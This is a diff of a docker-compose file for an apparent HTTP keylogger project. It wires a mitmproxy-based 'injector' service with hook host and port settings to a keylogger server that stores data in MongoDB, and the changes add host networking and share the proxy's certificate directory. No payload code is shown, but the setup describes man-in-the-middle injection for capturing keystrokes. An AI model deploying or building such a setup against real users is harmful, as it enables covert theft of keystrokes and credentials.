@@ -1,31 +1,34 @@
 version: '3.5'
 
-services: 
+services:
   injector:
     image: injector
     container_name: injector
     build:
       context: ./injector
     volumes:
-      - C:/Data/http_keylogger/injector/mitmproxy:/root/.mitmproxy
+      - ./mitmproxy:/root/.mitmproxy
     ports:
       - 8080:8080
     environment:
       - HOOK_HOST=$HOOK_HOST
       - HOOK_PORT_HTTP=$HOOK_PORT_HTTP
       - HOOK_PORT_HTTPS=$HOOK_PORT_HTTPS
+    network_mode: host
 
   keylogger:
     image: nesatfit/keylogger:latest
     build:
       context: ./keyloggerServer
     container_name: keylogger
-    command: --db=mongo --hook_host=$HOOK_HOST --hook_port_http $HOOK_PORT_HTTP --hook_port_https $HOOK_PORT_HTTPS 
+    command: --db=mongo --hook_host=$HOOK_HOST --hook_port_http $HOOK_PORT_HTTP --hook_port_https $HOOK_PORT_HTTPS
     ports:
       - 8081:80
-      - 8445:443  
+      - 8445:443
       - 7000:7000
     restart: unless-stopped
+    volumes:
+      - ./mitmproxy:/data:ro
 
   mongo:
     container_name: keylogger_mongo
